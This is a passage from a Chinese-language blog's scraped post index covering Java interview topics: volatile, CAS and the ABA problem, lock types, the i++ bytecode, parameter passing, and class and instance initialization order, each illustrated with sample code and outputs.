立即同步给了主内存，主内存的值为 1，而线程 a 此时也执行完了，同步给了主内存，此时的值仍然是 1，线程 b 的结果被覆盖掉了。 解决 Volatile 不保证原子性的问题由于 Volatile 不保证原子性，导致基于 Volatile 变量的运算在并发下不是线程安全的，此时可以使用 AtomicInteger 这样的原子包装类来解决。 ★展开代码★ 123456789101112131415161718192021222324252627282930313233343536373839/** * 1. 使用AtomicInteger解决Volatile不保证原子性的问题 */ public class VolatileDemo3 { public static void main(String[] args) { MyData3 data = new MyData3(); for(int i = 0; i &lt; 20; i++) { new Thread(() - &gt; { for(int j = 0; j &lt; 1000; j++) { data.add(); } }).start(); } while(Thread.activeCount() &gt; 1) { Thread.yield(); } System.out.println("the number is " + data.number.get()); } } class MyData3 { // AtomicInteger类里的变量包含了volatile关键字 AtomicInteger number = new AtomicInteger(); public void add() { this.number.getAndIncrement(); } } 单例模式中 Volatile 的使用分析 ★展开代码★ 1234567891011121314151617181920212223242526272829303132333435363738394041/** * 单例模式 * 1) DCL（双端检锁）机制不一定是线程安全的，原因是有指令重排序的存在 * 2) 原因在多线程环境下，某一个线程执行到第一个检测，读取到的instance不为null时，instance的引用对象可能没有完成初始化 * 3) 指令重排只会保证串行语义的执行一致性（单线程），但并不会关心多线程间的语义一致性。所以当一条线程访问instance不为null时，由于instance实例未必已初始化完成，也就造成了线程安全问题 */public class VolatileDemo4{ private static VolatileDemo4 demo; private VolatileDemo4() { System.out.println("inited ..."); } public static VolatileDemo4 getInstance() { if(demo == null) { synchronized(VolatileDemo4.class) { if(demo == null) { demo = new VolatileDemo4(); } } } return demo; } public static void main(String[] args) { for(int i = 0; i &lt; 10; i++) { new Thread(() - &gt; { VolatileDemo4.getInstance(); }).start(); } }} 其中代码 demo = new VolatileDemo4(); 可以分为以下三步完成（伪代码）： 123memory = allocate(); //1.分配对象内存空间init(memory); //2.初始化对象instance = memory; //3.设置 instance 指向刚分配的内存地址，此时 instance != null 步骤二和步骤三不存在数据依赖关系，而且无论重排前还是重排后程序的执行结果在单线程中并没有改变，因此这种重排优化是允许的。指令重排后的伪代码如下： 123memory = allocate(); //1.分配对象内存空间instance = memory; //3.设置 instance 指向刚分配的内存地址，此时 instance != null，但是对象还没有完成初始化init(memory); //2.初始化对象 指令重排只会保证串行语义的执行一致性（单线程），但并不会关心多线程间的语义一致性。所以当一个线程访问 instance 不为 null 时，由于 instance 实例未必已初始化完成，也就造成了线程安全问题。为了保证线程安全，可以加入 volatile 关键字来禁止指令重排，完整的示例代码如下： ★展开代码★ 123456789101112131415161718192021222324252627282930313233343536373839/*** 单例模式中使用Volatile* 1) DCL（双端检锁）机制不一定是线程安全的，原因是有指令重排序的存在，加入volatile可以禁止指令重排 */public class VolatileDemo4{ private static volatile VolatileDemo4 demo; private VolatileDemo4() { System.out.println("inited ..."); } public static VolatileDemo4 getInstance() { if(demo == null) { synchronized(VolatileDemo4.class) { if(demo == null) { demo = new VolatileDemo4(); } } } return demo; } public static void main(String[] args) { for(int i = 0; i &lt; 10; i++) { new Thread(() - &gt; { VolatileDemo4.getInstance(); }).start(); } }} CAS面试内容一般由浅入深，涉及的内容为： 原子类 –&gt; CAS –&gt; UnSafe –&gt; CAS 底层思想 –&gt; ABA 问题 –&gt; 原子更新引用 –&gt; 如何解决 ABA 问题 CAS 是什么CAS（Conmpare And Swap，比较和交换）是一条 CPU 并发原语。它的功能是判断内存某个位置的值是否为预期值，如果是则更改为新的值，否则继续比较到两者相同为止，这个过程是原子的。CAS 并发原语体现在 Java 语言中就是 sun.misc.Unsafe 类中的各个方法。调用 UnSafe 类中的 CAS 方法，JVM 会帮我们实现 CAS 汇编指令。这是一种完全依赖于硬件的功能，通过它可以实现原子操作。由于 CAS 是一种系统原语，原语属于操作系统用语范畴，是由若干指令组成的，用于完成某个功能的一个过程，并且原语的执行必须是连续的，在执行过程中不允许被中断；也就是说 CAS 是一条 CPU 的原子指令，不会造成所谓的数据不一致性问题。java.util.concurrent 包中借助 CAS 实现了区别于 synchronouse 同步锁的一种乐观锁。 CAS 底层原理谈谈对 Unsafe 的理解 Unsafe 是 CAS 的核心实现类，由于 Java 方法无法直接访问底层系统，需要通过本地（native）方法来访问，Unsafe 相当于一个后门，基于该类可以直接操作特定内存的数据。Unsafe 类存在于 sun.misc 包中，其内部方法操作可以像 C/C++ 的指针一样直接操作内存，即 Java 中 CAS 操作的执行依赖于 Unsafe 类的方法。特别注意：在 JDK 8 中，Unsafe 类中的大多数方法都是 native 修饰的，也就是说 Unsafe 类中的方法都直接调用操作系统底层资源来执行相应任务。在 AtomicInteger 的源码里（如下第一张图），变量 valueOffset 表示该变量在内存中的偏移地址，因为 Unsafe 就是根据内存偏移地址获取数据的。变量 value 用 volatile 修饰，保证了多线程之间的内存可见性。 AtomicInteger 类的源码 AtomicInteger 类与 Unsafe 类的源码调用分析 假设线程 A 和线程 B 两个线程同时执行 getAndAddInt() 方法（分别在不同的 CPU 上）: 1）AtomicInteger 里面的 value 原始值为 3，即主内存中 AtomicInteger 的 value 为 3，根据 JMM 模型，线程 A 和线程 B 各自拷贝一份值为 3 的 value 的副本到各自的工作内存中 2）线程 A 通过 getIntVolatile(var1,var2) 拿到 value 值为 3，这时候线程 A 突然被挂起 3）线程 B 也通过 getIntVolatile(var1,var2) 拿到 value 值为 3，此时刚好线程 B 没有被挂起，并执行 compareAndSwapInt() 方法比较主内存中的值也是 3，成功修改主内存中的值为 4，线程 B 至此完成任务操作 4）这时候线程 A 恢复，执行 compareAndSwapInt() 方法比较，发现自己手里的数值和主内存中的数字 4 不一致，说明该值已经被其他线程抢先一步修改了，那 A 线程修改失败，只能重新操作一遍 5）线程 A 重新获取 value 的值，因为变量 value 是 volatile 修饰，所以其他线程对它的修改，线程 A 总是能够感知到，线程 A 继续执行 compareAndSwapInt() 方法进行比较和交换，直到成功为止 值得一提的是，UnSafe 类中的 compareAndSwapInt() 是一个本地方法，该方法的具体实现位于 unsafe.cpp 中。 CAS 的缺点 循环时间长开销大：如果 CAS 失败，会一直继续尝试；如果 CAS 长时间一直不成功，可能会给 CPU 带来很大的开销 只能保证一个共享变量的原子操作：对于多个共享变量操作时，循环 CAS 就无法保证操作的原子性了，此时可以使用锁来保证原子性 引出了 ABA 问题 CAS 的 ABA 问题在原子类（如 AtomicInteger）中 CAS 会导致 “ABA 问题”，这是因为 CAS 算法实现的一个重要前提是需要取出内存中某时刻的数据并在当下时刻比较并替换，那么在这个时间差里数据可能会发生变化。比如一个线程 One 从内存位置 V 中取出 A，这个时候另一个线程 Two 也从内存中取出 A，并且线程 Two 进行了一些操作将内存位置 V 中的值改为 B，然后线程 Two 又将内存位置 V 的数据改为 A，这时候线程 One 进行 CAS 操作会发现内存中仍然是 A，然后线程 One 就认为操作成功了。尽管线程 One 的 CAS 操作成功，但是不代表这个过程就是没问题的，这里有点狸猫换太子的意思。 原子更新引用原子引用JDK 提供了 AtomicInteger、AtomicBoolean、AtomicLong 等原子类，但如果需要对自定义的类（如 User 类）进行原子包装，那么则需要使用原子引用类 AtomicReference 来实现，示例代码如下： ★展开代码★ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152/** * 原子引用类 AtomicReference 的使用 */public class AtomicReferenceDemo { public static void main(String[] args) { User user1 = new User(20, "Jim"); User user2 = new User(24, "Tom"); AtomicReference&lt;User&gt; atomicReference = new AtomicReference&lt;User&gt;(); atomicReference.set(user1); boolean result = atomicReference.compareAndSet(user1, user2); System.out.println(result + " " + atomicReference.get()); boolean result2 = atomicReference.compareAndSet(user1, user2); System.out.println(result2 + " " + atomicReference.get()); }}class User { private int age; private String name; public int getAge() { return age; } public void setAge(int age) { this.age = age; } public String getName() { return name; } public void setName(String name) { this.name = name; } public User(int age, String name) { this.age = age; this.name = name; } @Override public String toString() { return "User [age=" + age + ", name=" + name + "]"; }} 12true User [age=24, name=Tom]false User [age=24, name=Tom] 版本号原子引用普通原子类（AtomicInteger）或者原子引用类（AtomicReference）会产生 ABA 问题，示例代码如下： ★展开代码★ 123456789101112131415161718192021222324252627/** * 会产生 ABA 问题的代码 */public class ABADemo { public static AtomicReference&lt;Integer&gt; atomicReference = new AtomicReference&lt;Integer&gt;(100); public static void main(String[] args) { new Thread(() -&gt; { atomicReference.compareAndSet(100, 101); atomicReference.compareAndSet(101, 100); }, "t1").start(); new Thread(() -&gt; { try { // 暂定两秒t2线程，保证上面的t1线程完成了一次ABA操作 TimeUnit.SECONDS.sleep(2); } catch (InterruptedException e) { e.printStackTrace(); } boolean result = atomicReference.compareAndSet(100, 102); System.out.println(result + " " + atomicReference.get()); }, "t2").start(); }} 1true 102 使用 AtomicStampedReference 版本号原子引用类解决 ABA 问题，示例代码如下： ★展开代码★ 12345678910111213141516171819202122232425262728293031323334353637383940414243/** * 使用 AtomicStampedReference 版本号原子引用类解决 ABA 问题 */public class AtomicStampedReferenceDemo { public static AtomicStampedReference&lt;Integer&gt; atomicStampedReference = new AtomicStampedReference&lt;Integer&gt;(100, 1); public static void main(String[] args) { new Thread(() -&gt; { int stamp = atomicStampedReference.getStamp(); System.out.println(Thread.currentThread().getName() + "初始版本号: " + stamp); try { // 暂定一秒t1线程，保证下面的t2线程拿到的初始版本号与t1的初始版本号一致 TimeUnit.SECONDS.sleep(1); } catch (InterruptedException e) { e.printStackTrace(); } atomicStampedReference.compareAndSet(100, 101, atomicStampedReference.getStamp(), atomicStampedReference.getStamp() + 1); System.out.println(Thread.currentThread().getName() + "第一次修改后的版本号: " + atomicStampedReference.getStamp()); atomicStampedReference.compareAndSet(101, 100, atomicStampedReference.getStamp(), atomicStampedReference.getStamp() + 1); System.out.println(Thread.currentThread().getName() + "第二次修改后的版本号: " + atomicStampedReference.getStamp()); }, "t1").start(); new Thread(() -&gt; { int stamp = atomicStampedReference.getStamp(); System.out.println(Thread.currentThread().getName() + "初始版本号: " + stamp); try { // 暂定两秒t2线程，保证上面的t1线程完成了一次ABA操作 TimeUnit.SECONDS.sleep(2); } catch (InterruptedException e) { e.printStackTrace(); } boolean result = atomicStampedReference.compareAndSet(100, 102, stamp, stamp + 1); System.out.println(Thread.currentThread().getName() + "是否修改成功：" + result + "，当前实际最新的版本号为： " + atomicStampedReference.getStamp()); System.out.println("当前实际最新值为：" + atomicStampedReference.getReference()); }, "t2").start(); }} 123456t1初始版本号: 1t2初始版本号: 1t1第一次修改后的版本号: 2t1第二次修改后的版本号: 3t2是否修改成功：false，当前实际最新的版本号为： 3当前实际最新值为：100 ABA 问题解决总结原子引用 + 版本号（类似时间戳）机制，可以直接使用 JDK 提供的版本号原子引用类 AtomicStampedReference 来解决 ABA 问题。 Java 锁公平锁和非公平锁公平锁和非公平锁介绍 JUC 包中的公平锁和非公平锁用的都是 ReentrantLock 公平锁：是指多个线程按照申请锁的顺序来获取锁，类似排队打饭，先到先得 非公平锁：是指多个线程获取锁的顺序并不是按照申请锁的顺序，有可能后申请的线程比先申请的线程优先获取锁。在高并发的情况下，有可能会造成优先级反转或者饥饿现象 公平锁和非公平锁的区别 公平锁：公平锁就是很公平，在并发情况下，每个线程在获取锁时会查看此锁维护的等待队列，如果为空，或者当前线程是等待队列的第一个，就占有锁，否则就会加入到等待队列中，以后会按照 FIFO 的规则从队列中取到自己 非公平锁：非公平锁比较粗鲁，上来就直接尝试占有锁，如果尝试失败，就再采取类似公平锁那种方式（等待队列）处理 JUC 包中 ReentrantLock 的创建可以指定构造函数的 boolean 类型来得到公平锁或非公平锁，默认是非公平锁。非公平锁的优点在于吞吐量比公平锁大。对于 Synchronized 而言，也是一种非公平锁。 可重入锁（递归锁）可重入锁（递归锁）介绍 可重入锁（递归锁）指的是同一个线程外层函数获得锁之后，内层递归函数仍然能获取该锁的代码，在同一线程在外层方法获取锁的时候，在进入内层方法会自动获取锁（代码如下）。也就是说，线程可以进入任何一个它已经拥有的锁所有同步着的代码块。ReentrantLock、Synchronized 都是典型的可重入锁（递归锁）。可重入锁最大的作用是可以避免死锁。 12345678910public class LockTest { public synchronized void method1() { method2(); } public synchronized void method2() { }} 验证 ReentrantLock 是可重入锁的代码 ★展开代码★ 123456789101112131415161718192021222324252627282930313233343536373839import java.util.concurrent.locks.ReentrantLock;/** * 可重入锁（递归锁） ReentrantLock 验证代码 */public class LockTest { private static ReentrantLock lock = new ReentrantLock(); public static void get() { lock.lock(); try { System.out.println(Thread.currentThread().getName() + "\\t invoked get()"); set(); } finally { lock.unlock(); } } public static void set() { lock.lock(); try { System.out.println(Thread.currentThread().getName() + "\\t invoked set()"); } finally { lock.unlock(); } } public static void main(String[] args) { new Thread(() -&gt; { get(); }, "t1").start(); new Thread(() -&gt; { get(); }, "t2").start(); }} 1234t1 invoked get()t1 invoked set()t2 invoked get()t2 invoked set() 自旋锁（SpinLock）自旋锁介绍 自旋锁是指尝试获取锁的线程不会立即阻塞，而是采用循环的方式去尝试获取锁，这样的好处是减少线程上下切换的消耗，缺点是循环获取锁的操作会消耗 CPU 资源。在 CAS 中 Unsafe 类使用自旋锁的代码如下图： 验证自旋锁的代码 ★展开代码★ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import java.util.concurrent.atomic.AtomicReference;/** * 自旋锁验证代码 */public class LockTest { private AtomicReference&lt;Thread&gt; atomicReference = new AtomicReference&lt;Thread&gt;(); public void lock() { System.out.println(Thread.currentThread().getName() + "\\t come in"); Thread thread = Thread.currentThread(); // 自旋锁实现 while (!atomicReference.compareAndSet(null, thread)) { // do something } System.out.println(Thread.currentThread().getName() + "\\t lock"); } public void unlock() { System.out.println(Thread.currentThread().getName() + "\\t unlock"); Thread thread = Thread.currentThread(); // 释放自旋锁 atomicReference.compareAndSet(thread, null); } public static void sleep(long mills) { try { Thread.sleep(mills); } catch (InterruptedException e) { e.printStackTrace(); } } public static void main(String[] args) { LockTest4 test = new LockTest4(); new Thread(() -&gt; { test.lock(); sleep(5000); test.unlock(); }, "t1").start(); sleep(1000); new Thread(() -&gt; { test.lock(); test.unlock(); }, "t2").start(); }} 123456t1 come int1 lockt2 come int1 unlockt2 lockt2 unlock 独占锁（写锁）与共享锁（读锁）独占锁（写锁）与共享锁（读锁）介绍 独占锁（写锁）：指该锁一次只能被一个线程所持有，对于 ReentrantLock 和 Synchronized 而言都是独占锁（写锁） 共享锁（读锁）：指该锁可被多个线程所持有，对于 ReentrantReadWriteLock，其读锁是共享锁，其写锁是独占锁。读锁（共享锁）可保证并发读是非常高效的，其中读写、写读、写写的过程是互斥的，而读读是可以共存的 验证独占锁（写锁）与共享锁（读锁）的代码 ★展开代码★ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172import java.util.HashMap;import java.util.Map;import java.util.concurrent.TimeUnit;import java.util.concurrent.locks.ReentrantReadWriteLock;/* * 验证读写锁，简单模拟MyBatis的缓存实现 * 多个线程同时读同一个资源没有问题，所以为了满足并发量，读取共享资源应该可以同时进行，但是写共享资源只能有一个线程 * 写操作：原子+独占，整个过程必须是一个完整的统一体，中间不许被分割，被打断 */class MyCache { private volatile Map&lt;String, Object&gt; map = new HashMap&lt;&gt;(); private ReentrantReadWriteLock reentrantReadWriteLock = new ReentrantReadWriteLock(); public void put(String key, Object value) { reentrantReadWriteLock.writeLock().lock(); try { System.out.println(Thread.currentThread().getName() + "\\t 正在写入：" + key); try { TimeUnit.MILLISECONDS.sleep(300); } catch (InterruptedException e) { e.printStackTrace(); } map.put(key, value); System.out.println(Thread.currentThread().getName() + "\\t 写入完成"); } catch (Exception e) { e.printStackTrace(); } finally { reentrantReadWriteLock.writeLock().unlock(); } } public void get(String key) { reentrantReadWriteLock.readLock().lock(); try { System.out.println(Thread.currentThread().getName() + "\\t 正在读取：" + key); try { TimeUnit.MILLISECONDS.sleep(300); } catch (InterruptedException e) { e.printStackTrace(); } Object result = map.get(key); System.out.println(Thread.currentThread().getName() + "\\t 读取完成" + result); } catch (Exception e) { e.printStackTrace(); } finally { reentrantReadWriteLock.readLock().unlock(); } }}public class ReadWriteLockDemo { public static void main(String[] args) { MyCache myCache = new MyCache(); for (int i = 1; i &lt;= 5; i++) { final int tempInt = i; new Thread(() -&gt; { myCache.put(tempInt + "", tempInt + ""); }, String.valueOf(i)).start(); } for (int i = 1; i &lt;= 5; i++) { final int tempInt = i; new Thread(() -&gt; { myCache.get(tempInt + ""); }, String.valueOf(i)).start(); } }} 12345678910111213141516171819202 正在写入：22 写入完成1 正在写入：11 写入完成5 正在写入：55 写入完成1 正在读取：14 正在读取：41 读取完成14 读取完成null4 正在写入：44 写入完成3 正在写入：33 写入完成3 正在读取：35 正在读取：52 正在读取：23 读取完成35 读取完成52 读取完成2 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"面试"},{title:"Java 基础面试题之一",url:"/posts/d6058b93.html",text:'自增变量代码案例: 12345678910public class Test { public static void main(String[] args) { int a = 10; int varNum = 66; varNum = varNum++; System.out.println(varNum); } // 运行结果： 66} 知识点： 局部变量表 (Local Variable Table)：一组变量值的存储空间，用于存放方法参数和方法内定义的局部变量 操作数栈：在内存分析的时候，都被放入了栈中，栈的特点是先进后出（LIFO），意味着先放进去的数，会被放在下面，后进去的数，一个一个垒在上面 iconst 虚拟机指令：将常量加载到操作数栈上（入栈），可以用来将 int 类型的数字、取值在 -1 到 5 之间的整数压入栈中 push 虚拟机指令：主要包括 bipush 和 sipush，它们的区别在于接收数据类型的不同，bipush 接收 8 位整数作为参数，sipush 接收 16 位整数，它们都可以将参数压入栈 istore_n 虚拟机指令：从操作数栈中弹出一个整数，并把它赋值给第 n 个局部变量 xload_n 虚拟机指令：表示将第 n 个局部变量压入操作数栈，比如 iload_1、fload_0、aload_0 等指令，其中 aload_n 表示将一个对象引用压栈 iinc 虚拟机指令：对给定的局部变量做自增操作，这条指令是少数几个执行过程中完全不修改操作数栈的指令；它接收两个操作数：第 1 个局部变量表的位置，第 2 个位累加数。比如常见的 i++ 就会产生这条指令 问题分析： 下面将使用 javap 工具来分析问题，javap 是 JDK 自带的反汇编器，可以查看 Java 编译器生成的字节码。通过它，可以对照源代码和字节码，从而更了解编译器内部的工作过程。执行以下命令： 编译命令： javac Test.java 反汇编命令： javap -c Test javap 反汇编后，会输出以下内容，其中 main() 里是 varNum = varNum++ 的执行过程 12345678910111213141516171819202122Compiled from "Test.java"public class Test { public Test(); Code: 0: aload_0 1: invokespecial #1 // Method java/lang/Object."&lt;init&gt;":()V 4: return public static void main(java.lang.String[]); Code: 0: bipush 10 2: istore_1 3: bipush 66 5: istore_2 6: iload_2 7: iinc 2, 1 10: istore_2 11: getstatic #2 // Field java/lang/System.out:Ljava/io/PrintStream; 14: iload_2 15: invokevirtual #3 // Method java/io/PrintStream.println:(I)V 18: return} 结合上面铺垫的虚拟机指令，这里讲解一下 main() 里的 0 -11 步骤的工作流程： 0: bipush 10 将参数 10 压入操作数栈 2: istore_1 从操作数栈中弹出一个数，赋给第一个局部变量（a） 3: bipush 66 将参数 66 压入操作数栈 5: istore_2 从操作数栈中弹出一个数，赋给第二个局部变量（varNum） 6: iload_2 将第二个局部变量（varNum）的值入栈，此时操作数栈的栈顶值为 66 7: iinc 2, 1 对第二个局部变量（varNum）做自增 1 操作，意味着局部变量 varNum 的值变为 67；特别注意，这里并没有修改操作数栈里的任何内容 10: istore_2 从操作数栈的栈顶弹出一个数（即 66）赋给第二个局部变量（varNum），意味局部变量 varNum 的值又变回 66 了 11: iload_2 将第二个局部变量（varNum）的值入栈，此时操作数栈的栈顶值为 66 最终打印结果就是：66 Java Lang Spec 在文中也提到： 自增运算符 ++ 的优先级大于赋值运算符 = 原文描述为 The result of the postfix increment expression is not a variable, but a value，翻译过来就是：后 ++ 符表达式的结果是个值而不是一个变量 进阶案例代码： 123456789101112public class Test { public static void main(String[] args) { int i = 1; i = i++; int j = i++; int k = i + ++i * i++; System.out.println("i=" + i); // 4 System.out.println("j=" + j); // 1 System.out.println("k=" + k); // 11 }} ★展开完整的 Java 字节码★ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758Compiled from "Test.java"public class Test { public Test(); Code: 0: aload_0 1: invokespecial #1 // Method java/lang/Object."&lt;init&gt;":()V 4: return public static void main(java.lang.String[]); Code: 0: iconst_1 1: istore_1 2: iload_1 3: iinc 1, 1 6: istore_1 7: iload_1 8: iinc 1, 1 11: istore_2 12: iload_1 13: iinc 1, 1 16: iload_1 17: iload_1 18: iinc 1, 1 21: imul 22: iadd 23: istore_3 24: getstatic #2 // Field java/lang/System.out:Ljava/io/PrintStream; 27: new #3 // class java/lang/StringBuilder 30: dup 31: invokespecial #4 // Method java/lang/StringBuilder."&lt;init&gt;":()V 34: ldc #5 // String i= 36: invokevirtual #6 // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder; 39: iload_1 40: invokevirtual #7 // Method java/lang/StringBuilder.append:(I)Ljava/lang/StringBuilder; 43: invokevirtual #8 // Method java/lang/StringBuilder.toString:()Ljava/lang/String; 46: invokevirtual #9 // Method java/io/PrintStream.println:(Ljava/lang/String;)V 49: getstatic #2 // Field java/lang/System.out:Ljava/io/PrintStream; 52: new #3 // class java/lang/StringBuilder 55: dup 56: invokespecial #4 // Method java/lang/StringBuilder."&lt;init&gt;":()V 59: ldc #10 // String j= 61: invokevirtual #6 // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder; 64: iload_2 65: invokevirtual #7 // Method java/lang/StringBuilder.append:(I)Ljava/lang/StringBuilder; 68: invokevirtual #8 // Method java/lang/StringBuilder.toString:()Ljava/lang/String; 71: invokevirtual #9 // Method java/io/PrintStream.println:(Ljava/lang/String;)V 74: getstatic #2 // Field java/lang/System.out:Ljava/io/PrintStream; 77: new #3 // class java/lang/StringBuilder 80: dup 81: invokespecial #4 // Method java/lang/StringBuilder."&lt;init&gt;":()V 84: ldc #11 // String k= 86: invokevirtual #6 // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder; 89: iload_3 90: invokevirtual #7 // Method java/lang/StringBuilder.append:(I)Ljava/lang/StringBuilder; 93: invokevirtual #8 // Method java/lang/StringBuilder.toString:()Ljava/lang/String; 96: invokevirtual #9 // Method java/io/PrintStream.println:(Ljava/lang/String;)V 99: return} 案例小结: 赋值操作符 = 最后计算 赋值操作符 = 右边的从左到右加载值依次压入操作数栈 实际先算哪个，看运算符的优先级 自增、自减操作都是直接修改变量的值，不经过操作数栈 在最后的赋值之前，临时结果都是存储在操作数栈中 方法参数传递知识点： 形参是基本数据类型时 传递数据值 实参是引用数据类型 传递地址值：类对象类型、数组 特殊的类型：String、包装类（如 Integer）等对象拥有不可变性 代码案例： 12345678910111213141516171819202122232425262728293031323334353637public class Example { public static void main(String[] args) { int i = 1; String str = "hello"; Integer num = 200; int[] arr = { 1, 2, 3, 4, 5 }; MyData my = new MyData(); change(i, str, num, arr, my); System.out.println("i = " + i); System.out.println("str = " + str); System.out.println("num = " + num); System.out.println("arr = " + Arrays.toString(arr)); System.out.println("my.a = " + my.a); // 运行结果 // i = 1 // str = hello // num = 200 // arr = [2, 2, 3, 4, 5] // my.a = 11 } public static void change(int j, String s, Integer n, int[] a, MyData data) { j += 1; s += "world"; n += 1; a[0] += 1; data.a += 1; }}class MyData { int a = 10;} 分析过程： 点击图解查看分析过程 类与实例初始化类初始化类的初始化过程： 一个类要创建实例需要先加载并初始化该类（main() 方法所在的类需要先加载和初始化） 一个子类要初始化需要先初始化父类 一个类初始化，本质就是执行 &lt;clinit&gt;() 方法 &lt;clinit&gt;() 方法由静态类变量赋值代码和静态代码块组成 静态类变量赋值代码和静态代码块代码从上到下顺序执行 &lt;clinit&gt;() 方法只会执行一次 实例初始化实例的初始化过程，本质就是执行 &lt;init&gt;() 方法： &lt;init&gt;() 方法可能重载有多个，有几个构造器就有几个 &lt;init&gt;() 方法 &lt;init&gt;() 方法由非静态实例变量赋值代码和非静态代码块、对应构造器代码组成 非静态实例变量赋值代码和非静态代码块代码从上到下顺序执行，而构造器的代码永远最后执行 每次创建实例对象，调用对应构造器，执行的就是对应的 &lt;init&gt;() 方法 &lt;init&gt; 方法的首行是 super() 或 super(实参列表)，即对应父类的 &lt;init&gt; 方法 重写与重载 两者的区别： 重写（Override）也称覆盖，它是父类与子类之间多态性的一种表现，而重载（Overload）是一个类中多态性的一种表现 重写（Override 它是覆盖了父类的一个方法并且对其重写，以求达到不同作用 重载（Overload）它是指定义一些名称相同的方法，通过定义不同的输入参数来区分这些方法 重写（Override）的规则 参数列表必须与被重写方法的相同 非抽象子类中必须重写父类中的 abstract 方法 访问修饰符的限制一定不能不小于被重写方法的访问修饰符 不能重写被标识为 final、private、static 的方法（子类中不可见的方法） 子类直接再写一个同名的方法，这并不是对父类方法进行重写（Override），而是重新生成一个新的方法 重写的方法不能抛出新的异常，或者超过了父类范围的异常，但是可以抛出更少、更有限的异常，或者不抛出异常 重载（Overload）的规则： 重载是针对于一个类而言的 不能重载只有返回值类型不同的方法 方法的异常类型和数目不会对重载造成影响 不能通过访问权限、返回类型、抛出的异常进行重载 与被重载的方法比较，参数的类型、个数、顺序至少有一个不相同 对象的多态性 非静态方法默认的调用对象是 this this 对象在构造器或者说 &lt;init&gt;() 方法中就是正在创建的对象 子类如果重写了父类的方法，通过子类对象调用的一定是子类重写过的代码 面试案例分析问答互动： 为什么在实例化子类的对象时，会先调用父类的构造器？ 子类继承父类后，获取到父类的属性和方法，这些属性和方法在使用前必须先初始化，所以须先调用父类的构造器进行初始化 在哪里调用父类的构造器？ 父类的构造器是不能被继承的，但可以用 super() 来调用 在子类构造器的第一行会隐式的调用 super()，即调用父类的默认无参构造器 如果父类中没有定义无参的构造器，则必须在子类的构造器的第一行显式地调用 super(参数) ，以此调用父类中的有参构造器 代码案例： 12345678910111213141516171819202122232425262728293031323334353637383940414243public class Father { private int i = test(); private static int j = method(); static { System.out.print("(1)"); } public Father() { System.out.print("(2)"); } { System.out.print("(3)"); } public int test() { System.out.print("(4)"); return 1; } public static int method() { System.out.print("(5)"); return 1; } public static void main(String[] args) { Father f1 = new Father(); System.out.println(); Father f2 = new Father(); } // 运行结果： // (5)(1)(4)(3)(2) // (4)(3)(2) // 分析结果： // 静态类变量赋值代码和静态代码块代码从上到下顺序执行 (5)(1) // 非静态实例变量赋值代码和非静态代码块代码从上到下顺序执行 (4)(3) // 构造器的代码永远最后执行 (2) // 由于创建了两个 Father 对象，因此实例化方法 &lt;init&gt;() 执行了两次 (4)(3)(2)} 12345678910111213141516public class Son extends Father{ public Son() { } public static void main(String[] args){ Son test = new Son(); } // 运行结果： // (5)(1)(4)(3)(2) // 分析过程： // 实例化子类的对象时，默认会先通过 super() 调用父类的构造器方法，即先创建父类对象} 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849public class Son extends Father { private int i = test(); private static int j = method(); static { System.out.print("(6)"); } public Son() { System.out.print("(7)"); } { System.out.print("(8)"); } public int test() { System.out.print("(9)"); return 1; } public static int method() { System.out.print("(10)"); return 1; } public static void main(String[] args) { Son s1 = new Son(); System.out.println(); Son s2 = new Son(); } // 运行结果： // (5)(1)(10)(6)(9)(3)(2)(9)(8)(7) // (9)(3)(2)(9)(8)(7) // 分析过程： // 初始化父类和子类： // 1) 先初始化父类：(5)(1) // 2) 初始化子类：(10)(6) // 调用子类的实例化方法 &lt;init&gt;()： // 1) super()，期间调用了子类中被重写的 test() 方法 (9)(3)(2) // 2) i= test() (9) // 3) 子类的非静态代码 (8) // 4) 子类的无参构造方法 (7) // 由于创建了两个 Son 对象，因此实例化方法 &lt;init&gt;() 执行了两次 // (9)(3)(2)(9)(8)(7)} 局部变量与成员变量知识点： 就近原则 变量的分类 局部变量 成员变量：包括类变量、实例变量 局部变量与成员变量的区别 声明的地方 局部变量声明的地方：方法体 {} 中、形参、代码块 {} 中 成员变量声明的地方：类中方法外 类变量：有 static 修饰 实例变量：没有 static 修饰 修饰符的使用 局部变量：final 成员变量：public、protected、private、final、static、volatile、transient 值存储的位置 局部变量：栈 成员变量 类变量：方法区 实例变量：堆 作用域 局部变量：从声明处开始，到所属的 } 结束 成员变量 类变量：在当前类中通过 类名. 访问，在其他类中通过 类名. 或者 对象名. 访问 实例变量：在当前类中通过 this.，在其他类中通过 对象名. 访问 生命周期 局部变量：每一个线程，每一次调用执行都是新的生命周期 成员变量 类变量：随着类的初始化而初始化，随着类的卸载而消亡，该类的所有对象的类变量是共享的 实例变量：随着对象的创建而初始化，随着对象的被回收而消亡，每一个对象的实例变量都是互相独立的 当局部变量与成员变量重名时，如何区分？ 局部变量与类变量重名：在类变量前加 类名. 局部变量与实例变量重名：在实例变量前加 this. 非静态代码块的执行：每次创建实例对象时都会执行 代码案例： 12345678910111213141516171819202122232425262728293031323334public class Example { static int s; int i; int j; { int i = 1; i++; j++; s++; } public void test(int j) { i++; j++; s++; } public static void main(String[] args) { Example obj1 = new Example(); Example obj2 = new Example(); obj1.test(10); obj1.test(20); obj2.test(30); System.out.println(obj1.i + ", " + obj1.j + ", " + obj1.s); System.out.println(obj2.i + ", " + obj2.j + ", " + obj2.s); // 运行结果： // 2, 1, 5 // 1, 1, 